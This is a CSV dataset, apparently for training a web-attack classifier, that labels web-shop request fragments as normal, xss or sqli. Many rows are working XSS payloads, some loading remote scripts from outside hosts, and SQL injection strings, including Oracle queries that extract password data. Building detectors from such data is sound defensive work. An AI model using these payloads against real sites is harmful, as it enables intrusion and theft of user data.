payload,type
"<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(123)}),x</script>",xss
sirola@professionalhost.cc,normal
"labiano, s/n 7?a",normal
imagenes/cmenbul.gif,normal
$despumar,normal
bellaguarda,normal
publico/productos.jsp,normal
miembros/imagenes/ogono.jpg,normal
</plaintext\></|\><plaintext/onmouseover=prompt(1),xss
publico/autenticar.jsp?modo=entrar&login=safaa6&pwd=ilUSivA&remember=on&B1=Entrar,normal
publico/productos.jsp,normal
radunsky_oses@guejosgratis.cg,normal
imagenes/3.gif,normal
sonsoles,normal
imagenes/2.gif,normal
contrapalanqun,normal
miembros/imagenes/ogono.jpg,normal
7.84E+15,normal
calle petunias 34 1-e,normal
charmion,normal
gervasio,normal
"<img src=""blah>"" onmouseover=""document.vulnerable=true;"">",xss
&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;,xss
imagenes/cmenbul.gif,normal
miembros/fotos.jsp,normal
o.n&1: select * from users where id=1 <@.$ or 1=1 -- 1,sqli
"<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>",xss
miembros/imagenes/zarauz.jpg,normal
publico/pagar.jsp?modo=insertar&precio=4364&B1=Pasar+por+caja,normal
21468433a,normal
"<img src=""javascript:document.vulnerable=true;"">",xss
"<img\x47src=x onerror=""javascript:alert(1)"">",xss
imagenes/nuestratierra.jpg,normal
miembros/imagenes/ogono.jpg,normal
index.jsp,normal
""" or isNULL(1/0) /*",sqli
perene,normal
1 or 1=1,sqli
miembros/imagenes/ogono.jpg,normal
miembros/fotos.jsp,normal
hi') or ('a'='a,sqli
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"<a href=""\x0Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
bjorn,normal
global/titulo.jsp,normal
sal37a,normal
publico/autenticar.jsp?modo=entrar&login=keehn&pwd=abogada&remember=off&B1=Entrar,normal
imagenes/nuestratierra.jpg,normal
"<img STYLE=""xss:expr/*XSS*/ession(document.vulnerable=true)"">",xss
c/ san ildefonso 106 10?h,normal
imagenes/2.gif,normal
miembros/salir.jsp,normal
"s?UEs: select * from users where id=1 or 1#""? union select 'a',version() -- 1",sqli
r2s058ada,normal
dao,normal
"<a href=""\x10javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
publico/caracteristicas.jsp?id=1,normal
miembros/index.jsp,normal
"<frameset onBlur frameset onBlur=""javascript:javascript:alert(1)""></frameset onBlur>",xss
23266,normal
<img SRC='vbscript:document.vulnerable=true;'>,xss
19185,normal
publico/registro.jsp?modo=registro&login=farlay&password=escribida&nombre=Nela&apellidos=Magrans+Ribes&email=tchistyakov-linn-baker%40pool-control.tw&dni=12361918Q&direccion=Guipuzcoa+198%2C+1%3FD&ciudad=Villanueva+de+Sigena&cp=25300&provincia=Guip%FAzcoa&ntc=6545971193644202&B1=Registrar,normal
huesca,normal
piedramillera,normal
miembros/imagenes/castro.jpg,normal
"s?1s: select * from users where id=1 or ""]1"" or 1=1 -- 1",sqli
25187,normal
schouwen,normal
global/titulo.jsp,normal
"&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;",xss
a' or 3=3--,sqli
publico/caracteristicas.jsp?id=2,normal
publico/registro.jsp?modo=registro&login=keighley&password=ca26lot9&nombre=Denice&apellidos=Mompel+Urdi&email=harkin%40escapadajoven.gq&dni=11696227Z&direccion=Calle+Fresno%2C+66%2C+10%3FD&ciudad=Valdehorna&cp=17743&provincia=Valladolid&ntc=7840274194886704&B1=Registrar,normal
l-9rn,normal
<embed src=%(jscript)s></embed>,xss
publico/productos.jsp,normal
<body ONLOAD=document.vulnerable=true;>,xss
confirmar,normal
"<style><img src=""</style><img src=x onerror=javascript:alert(1)//"">",xss
global/menum.jsp,normal
imagenes/2.gif,normal
publico/carrito.jsp,normal
global/titulo.jsp,normal
miembros/fotos.jsp,normal
&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;,xss
publico/carrito.jsp,normal
publico/autenticar.jsp?modo=entrar&login=nhat&pwd=t2591151&remember=off&B1=Entrar,normal
global/estilos.css,normal
piggott@firstchoicecoffee.gq,normal
".oUEf: select * from users where id=1. <@ union select version(),version() -- 1",sqli
25g0a00,normal
admin'or 1=1 or ''=',sqli
<iframe src=http://ha.ckers.org/scriptlet.html <,xss
stiller_kimball@socimi.com.ic,normal
2.39E+15,normal
1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>,xss
miembros/imagenes/castro.jpg,normal
"<a href=""\x11javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
publico/carrito.jsp,normal
miembros/fotos.jsp,normal
ramss,normal
miembros/index.jsp,normal
rosngela,normal
imagenes/2.gif,normal
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i,sqli
"<IMG SRC=\""jav&#x09;ascript:alert('XSS');\"">",xss
global/titulo.jsp,normal
""" or ""x""=""x",sqli
alvarez 35,normal
resquebrar,normal
imagenes/2.gif,normal
miembros/editar.jsp?modo=registro&login=scorziel&password=3o7za732&nombre=Nesserin&apellidos=Acheros+Sanchis&email=whipp%40esmeraldas.org.tm&dni=02314635F&direccion=Cami+Son+Anglada%2C+S%2FN+&ciudad=Barbad%E1s&cp=46120&provincia=Segovia&ntc=1611608298925836&B1=Registrar,normal
57401003h,normal
"s.v: select * from users where id=1 or "".@"" or 1=1 -- 1",sqli
"<body onkeyup body onkeyup=""javascript:javascript:alert(1)""></body onkeyup>",xss
14973109v,normal
global/menum.jsp,normal
hotta,normal
imagenes/logo.gif,normal
diccico_pastor@ao09.io,normal
cab,normal
<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->,xss
global/menum.jsp,normal
imagenes/1.gif,normal
miembros/index.jsp,normal
"<img \x39src=x onerror=""javascript:alert(1)"">",xss
global/menum.jsp,normal
c1236ometimi8nto,normal
miembros/imagenes/zarauz.jpg,normal
global/menum.jsp,normal
publico/productos.jsp,normal
global/titulo.jsp,normal
&,sqli
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>,xss
imagenes/1.gif,normal
"so..U: select * from users where id='1'<@.. union select 1,version() -- 1'",sqli
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
imagenes/cmenbul.gif,normal
global/creditos.jsp,normal
publico/pagar.jsp?modo=insertar&precio=1096&B1=Confirmar,normal
imagenes/2.gif,normal
7e2hered0962n,normal
imagenes/logo.gif,normal
log9era,normal
"<script src=""#"">{alert(1)}</script>;1",xss
global/creditos.jsp,normal
garmasin,normal
(sqlvuln),sqli
miembros/imagenes/castro.jpg,normal
&lt;!--&#91;if gte IE 4&#93;&gt;,xss
<script\x00>javascript:alert(1)</script>,xss
publico/registro.jsp?modo=registro&login=jamaly&password=retorta&nombre=Leonella&apellidos=Bonilla+Balac&email=ostyn.martan%40icodea.lu&dni=30599008S&direccion=Calle+Marino+Cervera%2C+173%2C+&ciudad=Paracuellos+de+Jarama&cp=09390&provincia=Teruel&ntc=4422802563710608&B1=Registrar,normal
"<script>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://www.securitycompass.com/xss.js""></script>",xss
publico/registro.jsp?modo=registro&login=sykes&password=k%E9fir&nombre=Marciana&apellidos=De+Jaime&email=navratil%40sindns.as&dni=66866648J&direccion=Zapata%2C+S%2FN+&ciudad=Lladurs&cp=43893&provincia=Navarra&ntc=0057204714004346&B1=Registrar,normal
miembros/editar.jsp?modo=registro&login=raab&password=ac6%EDdi9o&nombre=Thal%EDa&apellidos=Albornoz+Quiva&email=heldabrand5%40chevrolet-volt.bg&dni=11738063J&direccion=C%2F+Otumba%2C+132%2C+&ciudad=Carataunas&cp=43791&provincia=Cuenca&ntc=8400067402160298&B1=Registrar,normal
global/creditos.jsp,normal
publico/caracteristicas.jsp?id=1,normal
imagenes/2.gif,normal
?malgastador,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
global/creditos.jsp,normal
"""><h1><IFRAME width=""420"" height=""315"" SRC=""http://www.youtube.com/embed/sxvccpasgTE"" frameborder=""0"" onmouseover=""alert(document.cookie)""></IFRAME>123</h1>",xss
crovetto roger,normal
"<OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""><PARAM NAME=""DataURL"" VALUE=""javascript:alert(1)""></OBJECT>",xss
"snns: select * from users where id=1 or ""$_"" or 1=1 -- 1",sqli
5718,normal
miembros/fotos.jsp,normal
25769,normal
"'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --",sqli
imagenes/1.gif,normal
"passeig gaudi 77, 3-e",normal
"s(n: select * from users where id=1 or ""(["" or 1=1 -- 1",sqli
<;IMG SRC=JaVaScRiPt:alert(';XSS';)>;,xss
"UEvkn: select * from users where id=1   union select null,banner from v$version where rownum=1 -- 1",sqli
nardi borgua,normal
imagenes/1.gif,normal
declare @s varchar (8000) select @s = 0x73656c65637420404076657273696f6e,sqli
"ABC<div style=""x:\x09expression(javascript:alert(1)"">DEF",xss
"c/ pablo iglesias, 116",normal
particular teresa orozco 101,normal
miembros/editar.jsp?modo=registro&login=karchevs&password=cresta-da&nombre=Giuliana&apellidos=Nogu%E9+Caba%F1as&email=gillingwater_jordal%40lettere.gr&dni=09899393D&direccion=C%2F+Francia-urb.s.nicolas+171+&ciudad=Sanet+y+Negrals&cp=05147&provincia=Pontevedra&ntc=0452635229820629&B1=Registrar,normal
publico/carrito.jsp,normal
62386870z,normal
"perl -e 'print \""<SCR\0IPT>alert(\""XSS\"")</SCR\0IPT>\"";' > out",xss
publico/pagar.jsp?modo=insertar&precio=8715&B1=Confirmar,normal
"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",xss
"<a href=""\x16javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
lareo robles,normal
lavat@ajuntamentbarcelona20.gy,normal
"<base HREF=""javascript:document.vulnerable=true;//"">",xss
healy,normal
"calle ponte vella s/n, 13e",normal
imagenes/cmenbul.gif,normal
ostyn.martan@icodea.lu,normal
publico/productos.jsp,normal
miembros/imagenes/zarauz.jpg,normal
index.jsp,normal
miembros/index.jsp,normal
imagenes/2.gif,normal
<script\x0D>javascript:alert(1)</script>,xss
miembros/fotos.jsp,normal
miembros/imagenes/ogono.jpg,normal
"camino san jaime 97,",normal
imagenes/nuestratierra.jpg,normal
villalgordo del marquesado,normal
3023,normal
imagenes/logo.gif,normal
suwanawo5,normal
hole@chicashumedas.at,normal
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera},xss
publico/caracteristicas.jsp?id=2,normal
imagenes/logo.gif,normal
--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->,xss
"<a href=""\x0Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"robert graves, 101",normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
imagenes/3.gif,normal
global/menum.jsp,normal
mattos@velazquezlarraaga.dd,normal
&#X00003c;,xss
"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-",xss
publico/caracteristicas.jsp?id=1,normal
"voc: select * from users where id=1 + @<@# union select null,version() -- 1",sqli
"""><img src=x onerror=javascript:alert(1)>",xss
sin,normal
miembros/imagenes/ogono.jpg,normal
miembros/imagenes/zarauz.jpg,normal
imagenes/1.gif,normal
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i",sqli
miembros/imagenes/zarauz.jpg,normal
&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;,xss
espaldilla,normal
"""><img src=x onerror=javascript:alert(`A`)>",xss
brittani,normal
global/titulo.jsp,normal
.o1&1: select * from users where id=1.*1 or 1=1 -- 1,sqli
"ABC<div style=""x:\xE2\x80\x83expression(javascript:alert(1)"">DEF",xss
bette,normal
publico/registro.jsp?modo=registro&login=dottin&password=coladiza&nombre=Teobaldo&apellidos=Urbon&email=gomska.hopper%40ebuy.com.bi&dni=75010741J&direccion=Calle+Austria%2C+183+1-C&ciudad=Mierla%2C+La&cp=05147&provincia=Barcelona&ntc=7041334595483221&B1=Registrar,normal
shakor,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
15821726a,normal
miembros/fotos.jsp,normal
miembros/salir.jsp,normal
publico/productos.jsp,normal
bancalero,normal
91sc04de9o,normal
6267,normal
<video poster=javascript:javascript:alert(1)//,xss
"&lt;A HREF=\""http&#58;//google&#58;ha&#46;ckers&#46;org\""&gt;XSS&lt;/A&gt;",xss
0utaperc09,normal
5642,normal
imagenes/nuestratierra.jpg,normal
36574,normal
a' or 'a' = 'a,sqli
follosas,normal
43785,normal
imagenes/logo.gif,normal
"<script\x0Dtype=""text/javascript"">javascript:alert(1);</script>",xss
suen,normal
' or '' ',sqli
publico/productos.jsp,normal
4.92E+15,normal
4430,normal
global/estilos.css,normal
publico/miembros.jsp,normal
2.94E+14,normal
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i",sqli
6252,normal
garabana belart,normal
cabada ferrus,normal
imagenes/nuestratierra.jpg,normal
cuerva,normal
or,sqli
3.33E+15,normal
publico/autenticar.jsp?modo=entrar&login=gingeric&pwd=mOnImI%C1CEO&remember=off&B1=Entrar,normal
70489976j,normal
056cun95v08ac497,normal
mastelero,normal
"de los cazadores, 196, 1-b",normal
forsyne@velaconsultores.mx,normal
imagenes/3.gif,normal
isidro,normal
global/titulo.jsp,normal
publico/registro.jsp?modo=registro&login=cairisti&password=0a31e7a4&nombre=Luciano&apellidos=%C1vila+Kusanovic&email=moston%40sierradealcaraz.sg&dni=78128253J&direccion=Moncayo+46%2C+&ciudad=Cigudosa&cp=02649&provincia=Huesca&ntc=2771560137305516&B1=Registrar,normal
global/estilos.css,normal
s&ov&: select * from users where id='1' or !<@ or 1=1 -- 1',sqli
publico/productos.jsp,normal
global/titulo.jsp,normal
miembros/imagenes/castro.jpg,normal
22234,normal
<![CDATA[<script>var n=0;while(true){n++;}</script>]]>,xss
"s(UEf: select * from users where id=1 or 1#""( union select version(),version() -- 1",sqli
imagenes/logo.gif,normal
"<IMG SRC=x ondrop=""alert(String.fromCharCode(88,83,83))"">",xss
9.27E+15,normal
apolilladura,normal
miembros/salir.jsp,normal
jndula couttolenc,normal
miembros/editar.jsp?modo=registro&login=oblak&password=08Tiro72&nombre=Brisia&apellidos=Borrachero+Muros&email=swanson%40sexl.co&dni=51734480M&direccion=C%2F+Grabador+David+Roberts+154+1-H&ciudad=San+Mart%EDn+y+Mudri%E1n&cp=01169&provincia=Burgos&ntc=8961981301450385&B1=Registrar,normal
publico/productos.jsp,normal
malott,normal
<img src=xss onerror=alert(1)>,xss
publico/carrito.jsp,normal
requisitorio,normal
"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",xss
44588,normal
; or '1'='1',sqli
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//,xss
biosca,normal
miembros/imagenes/zarauz.jpg,normal
global/estilos.css,normal
miembros/index.jsp,normal
imagenes/logo.gif,normal
publico/productos.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
""" or ""a""=""a",sqli
%7C,sqli
<script ~~~>alert(0%0)</script ~~~>,xss
miembros/salir.jsp,normal
"<script\x20type=""text/javascript"">javascript:alert(1);</script>",xss
publico/miembros.jsp,normal
efran,normal
publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=100&cantidad=58&B1=A%F1adir+al+carrito,normal
"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",xss
miembros/imagenes/ogono.jpg,normal
imagenes/1.gif,normal
"<a href=""\x11javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
publico/carrito.jsp,normal
global/menum.jsp,normal
global/creditos.jsp,normal
5.84E+15,normal
"exp/*<A STYLE='no\xss:noxss(""*//*"");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>",xss
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;,xss
lloros*o,normal
"perl -e 'print ""<IMG SRC=java\0script:alert(\""XSS\"")>"";' > out",xss
miembros/imagenes/ogono.jpg,normal
sisante,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
reele.cto,normal
"&lt;SPAN DATASRC=\""#xss\"" DATAFLD=\""B\"" DATAFORMATAS=\""HTML\""&gt;&lt;/SPAN&gt;",xss
37618946p,normal
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39&cantidad=7&B1=A%F1adir+al+carrito,normal
"<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>",xss
leshowit,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
marcos esculta,normal
novalbos illarraga,normal
imagenes/cmenbul.gif,normal
global/estilos.css,normal
publico/miembros.jsp,normal
pesquisar,normal
"<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F",xss
imagenes/cmenbul.gif,normal
ezcurra lo cascio,normal
"UEoov: select * from users where id=1 union select +!<@,version() -- 1",sqli
imagenes/nuestratierra.jpg,normal
publico/registro.jsp?modo=registro&login=retallac&password=guRUpera&nombre=Roger&apellidos=Puppato+Marnetti&email=nilda%40nightflight.ec&dni=09185484C&direccion=Plza.+Mariano+Arregui+Canela+171%2C+&ciudad=B%E1rcena+de+Pie+de+Concha&cp=22200&provincia=Zamora&ntc=8331341352065092&B1=Registrar,normal
publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=80&B1=A%F1adir+al+carrito,normal
"<a href=""javas\x02cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
burg,normal
weld@yiutuve.vc,normal
imagenes/3.gif,normal
miembros/imagenes/castro.jpg,normal
lopiano,normal
imagenes/2.gif,normal
1.65E+15,normal
"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"""><img src=x onerror=javascript:alert(`1`)>",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d",xss
global/menum.jsp,normal
publico/caracteristicas.jsp?id=1,normal
"&lt;STYLE TYPE=\""text/javascript\""&gt;alert('XSS');&lt;/STYLE&gt;",xss
imagenes/1.gif,normal
index.jsp,normal
"<IMG SRC=x oncuechange=""alert(String.fromCharCode(88,83,83))"">",xss
c/ galvan 98 10?a,normal
imagenes/logo.gif,normal
<script>/* *\x00/javascript:alert(1)// */</script>,xss
"<a&#32;href&#61;&#91;&#00;&#93;""&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;"">XYZ</a",xss
5arneci052,normal
31560,normal
&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;,xss
publico/carrito.jsp,normal
imagenes/3.gif,normal
imagenes/logo.gif,normal
imagenes/2.gif,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
16,normal
global/menum.jsp,normal
57978068j,normal
"UEv1f: select * from users where id=1 union select  @ $,version() -- 1",sqli
"&lt;XSS STYLE=\""behavior&#58; url(xss&#46;htc);\""&gt;",xss
"sUE,v: select * from users where id='1' union select \,@@VERSION -- 1'",sqli
413f1go,normal
"<div style=""list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));"">X",xss
souther,normal
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i,sqli
c/ grabador david roberts 154 1-h,normal
imagenes/nuestratierra.jpg,normal
24152,normal
mio de san esteban,normal
goldsmith1@esmarbella.ht,normal
25938703q,normal
"sn: select * from users where id='1' union select ""[""_,version() -- 1'",sqli
publico/carrito.jsp,normal
f36hu1a,normal
muiz,normal
57317186j,normal
"<img \x00src=x onerror=""javascript:alert(1)"">",xss
milmarcos,normal
savoula,normal
1'1,sqli
global/titulo.jsp,normal
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39&cantidad=90&B1=A%F1adir+al+carrito,normal
global/menum.jsp,normal
"<bgsound onPropertyChange bgsound onPropertyChange=""javascript:javascript:alert(1)""></bgsound onPropertyChange>",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
almazn cayul,normal
focas@programaciones.com.sz,normal
almonacid de la cuba,normal
global/titulo.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
publico/pagar.jsp?modo=insertar&precio=911&B1=Confirmar,normal
shue-sampson@artroscopiagc.mn,normal
"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",xss
miembros/index.jsp,normal
chung,normal
imagenes/logo.gif,normal
5.83E+15,normal
global/estilos.css,normal
miembros/imagenes/ogono.jpg,normal
o.neil,normal
paula,normal
natala,normal
"<XSS STYLE=""xss:expression(alert('XSS'))"">",xss
"jose gomez gallito, 107,",normal
global/creditos.jsp,normal
"c/ luarca, 151, 7?g",normal
eial,normal
imagenes/cmenbul.gif,normal
43896,normal
%2A%7C,sqli
surai,normal
maryrose,normal
global/creditos.jsp,normal
publico/autenticar.jsp?modo=entrar&login=hakeem&pwd=7E2HEREd0962N&remember=off&B1=Entrar,normal
publico/miembros.jsp,normal
"&lt;?xml&#58;namespace prefix=\""t\"" ns=\""urn&#58;schemas-microsoft-com&#58;time\""&gt;",xss
publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=22&B1=A%F1adir+al+carrito,normal
42808198t,normal
ellston balladares,normal
cadenat.mulich@4ghz.do,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"""/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />",xss
publico/productos.jsp,normal
<iframe src=%(scriptlet)s <,xss
kwokchoi,normal
publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=78&B1=A%F1adir+al+carrito,normal
correnta,normal
"<img src\x00=x onerror=""javascript:alert(1)"">",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
miembros/index.jsp,normal
60996626m,normal
soulef,normal
&#060,xss
publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=100&cantidad=14&B1=A%F1adir+al+carrito,normal
miembros/fotos.jsp,normal
miembros/salir.jsp,normal
"<;BODY BACKGROUND="";javascript:alert(';XSS';);"";>;",xss
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera},xss
48707568p,normal
torre-pacheco,normal
&LT,xss
alfajarn,normal
1.13E+15,normal
delfina,normal
publico/autenticar.jsp?modo=entrar&login=aguistin&pwd=iNnota&remember=on&B1=Entrar,normal
publico/autenticar.jsp?modo=entrar&login=afkham&pwd=o%24ficinesca&remember=off&B1=Entrar,normal
"<script\x3Etype=""text/javascript"">javascript:alert(1);</script>",xss
"<input TYPE=""IMAGE"" SRC=""javascript:document.vulnerable=true;"">",xss
"1oo1U: select * from users where id=1 + \+%1 union select null,@@VERSION -- 1",sqli
publico/caracteristicas.jsp?id=2,normal
6egas0a,normal
28530,normal
globula*riceo,normal
global/estilos.css,normal
publico/productos.jsp,normal
39638,normal
"s?{s: select * from users where id=1 or ""]{"" or 1=1 -- 1",sqli
"rua bamio, 190 11?h",normal
global/titulo.jsp,normal
"<script>alert(""XSS by \nxss"")</script><marquee><h1>XSS by xss</h1></marquee>",xss
"<IMG SRC=# onmouseover=""alert('xxs')"">",xss
miembros/index.jsp,normal
publico/carrito.jsp,normal
"c/ corint, 13 11?a",normal
"<a href=""\xE2\x80\x87javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
global/menum.jsp,normal
"<html onMouseOver html onMouseOver=""javascript:javascript:alert(1)""></html onMouseOver>",xss
9ig7a2i4,normal
publico/miembros.jsp,normal
2.80E+15,normal
2865,normal
miembros/imagenes/castro.jpg,normal
miembros/imagenes/zarauz.jpg,normal
imagenes/logo.gif,normal
san perfecto 8,normal
miembros/imagenes/zarauz.jpg,normal
8485,normal
publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=83&B1=A%F1adir+al+carrito,normal
miembros/fotos.jsp,normal
&noo&: select * from users where id=1 or $+<\ or 1=1 -- 1,sqli
"&lt;FRAMESET&gt;&lt;FRAME SRC=\""javascript&#058;alert('XSS');\""&gt;&lt;/FRAMESET&gt;",xss
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>",xss
publico/productos.jsp,normal
miembros/salir.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
4.16E+15,normal
publico/caracteristicas.jsp?id=2,normal
"""`'><script>\xE2\x80\x80javascript:alert(1)</script>",xss
miembros/imagenes/castro.jpg,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
'/**/or/**/1/**/=/**/1,sqli
"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",xss
morcn,normal
19243,normal
soo&1: select * from users where id='1' + $+%\ or 1=1 -- 1',sqli
"s&v1U: select * from users where id='1' or @ 1=1 union select 1,version() -- 1'",sqli
publico/pagar.jsp?modo=insertar&precio=5031&B1=Confirmar,normal
".UE1,: select * from users where id=1.  union select 1,version() -- 1",sqli
41100,normal
imagenes/1.gif,normal
<script\x00>javascript:alert(1)</script>,xss
miembros/imagenes/zarauz.jpg,normal
"av. don juan de borbon, s/n",normal
ortuella,normal
holbrook,normal
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://www.securitycompass.com/scriptlet.html""></object>",xss
element[attribute='<img src=x onerror=alert('XSS');>,xss
imagenes/nuestratierra.jpg,normal
c/ nicolas salmeron 73,normal
"`""'><img src=xxx:x \x0Aonerror=javascript:alert(1)>",xss
indocto,normal
imagenes/3.gif,normal
e5670cij3,normal
publico/carrito.jsp,normal
"<a href=""data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>"">X</a",xss
publico/registro.jsp?modo=registro&login=darbie&password=nu%F1o&nombre=Galatas&apellidos=Hormachea+Vilamasa&email=berghof%40esbien.bt&dni=06434691G&direccion=Glorieta+Mineros%2C+3%2C+&ciudad=Salobral&cp=37799&provincia=Cuenca&ntc=6262014386687000&B1=Registrar,normal
